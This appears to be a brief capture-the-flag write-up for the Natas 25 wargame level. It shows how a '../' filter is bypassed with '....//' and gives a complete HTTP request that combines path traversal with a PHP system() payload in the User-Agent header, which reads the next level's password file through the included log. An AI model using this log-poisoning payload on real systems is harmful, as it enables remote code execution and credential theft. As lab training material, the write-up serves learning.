# LFI PoC

## Description
1. The ```str_replace()``` filter is easily bypassed:

Example:
```php
php -r 'print(str_replace("../", "", "....//") . "\n");'
```

2. The log function includes the User-Agent without any validation.

## Request
```
GET /?lang=....//logs/natas25_kiuh65auel8ahc3u7md3rujio4.log HTTP/1.1
Host: natas25
User-Agent: <?php system("cat /etc/natas_webpass/natas26"); ?>
Cookie: PHPSESSID=kiuh65auel8ahc3u7md3rujio4
```

## Resources
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
